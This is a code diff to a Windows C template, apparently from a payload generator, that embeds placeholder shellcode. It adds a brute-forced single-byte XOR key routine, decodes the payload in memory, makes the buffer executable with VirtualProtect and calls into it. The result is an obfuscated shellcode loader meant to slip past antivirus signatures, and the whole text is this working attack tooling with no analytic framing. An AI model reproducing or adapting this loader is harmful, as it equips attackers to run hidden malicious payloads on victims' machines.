@@ -1,11 +1,32 @@
 #include <Windows.h>
 
 #define SCSIZE <%= payload_length %>
+
 char bPayload[SCSIZE] = "<%= payload %>";
+
+char GetKey()
+{
+	char hardcoded = bPayload[0];
+	for (int i = 0; i <= 255; i++)
+	{
+		char res = i ^ hardcoded;
+                if (res == (char)<%= "0x%02x"% control_byte %>)
+			return (char)i;
+	}
+}
 
 void main() {
 	DWORD dwOldProtect;
+	char* payload_fnc = NULL;
+	char key = GetKey();
+
+	for (int i = 0; i < SCSIZE; i++)
+	{
+		bPayload[i] = bPayload[i] ^ key;
+        }
+        payload_fnc = bPayload + 1;
 	VirtualProtect(bPayload, SCSIZE, PAGE_EXECUTE_READWRITE, &dwOldProtect);
-	(*(void (*)()) bPayload)();
+	(*(void (*)()) payload_fnc)();
 	return;
 }
+
